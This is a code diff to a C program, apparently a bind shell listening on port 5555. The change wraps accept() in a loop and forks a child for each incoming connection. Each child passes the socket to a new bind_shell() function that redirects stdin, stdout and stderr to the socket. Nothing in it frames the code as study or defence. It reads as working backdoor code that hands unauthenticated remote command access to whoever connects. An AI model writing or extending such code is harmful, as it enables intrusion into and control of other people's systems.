@@ -9,7 +9,7 @@
 #define PORT 5555
 
 int main(int argc, char **argv) {
-    int sockfd, newsockfd;
+    int sockfd, newsockfd, pid;
     struct sockaddr_in server_addr;
 
     // create socket
@@ -49,17 +49,33 @@ int main(int argc, char **argv) {
     }
     printf("Listening for connections.\n");
 
-    // accept new connection
-    newsockfd = accept(sockfd, NULL, NULL);
-    if (newsockfd < 0) {
-        perror("Connection failed");
-        exit(1);
-    }
-    printf("Connection established.\n");
+    while (1) {
+        // accept new connections
+        newsockfd = accept(sockfd, NULL, NULL);
+        if (newsockfd < 0) {
+            perror("Connection failed");
+            exit(1);
+        }
+        printf("Connection established.\n");
 
+        pid = fork();
+        if (pid < 0) {
+            perror("Error on fork");
+            exit(1);
+        } else if (pid == 0) {
+            close(sockfd);
+            bind_shell(newsockfd);
+            exit(0);
+        } else {
+            close(newsockfd);
+        }
+    }
+}
+
+void bind_shell(int sockfd) {
     // duplicate new socket to stdin/out/err
     for (int i=0; i<3; i++) {
-        if (dup2(newsockfd, i) < 0) {
+        if (dup2(sockfd, i) < 0) {
             perror("Error duplicating connected socket");
             exit(1);
         }
